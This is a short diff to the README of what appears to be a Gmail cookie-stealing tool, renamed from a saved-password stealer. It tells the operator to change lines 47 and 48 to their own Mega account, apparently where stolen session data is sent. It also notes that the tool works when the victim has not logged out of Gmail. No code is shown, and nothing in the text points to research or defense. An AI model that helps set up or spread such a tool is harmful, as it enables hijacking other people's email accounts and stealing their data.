@@ -46,9 +46,9 @@ This tool will work if user doesn't logout their Gmail Account in their browser.
  
 ### Change Account
 
-Change line 200 and 201 to your own mega account
+Change line 47 and 48 to your own mega account
 
-<img src="https://github.com/katakkentut/SavedPasswordStealerPython/blob/master/screenshot/Screenshot%202022-09-11%20234424.png">
+<img src="https://github.com/katakkentut/GmailCookieStealer/blob/master/screenshot/new.png">
 
 
  
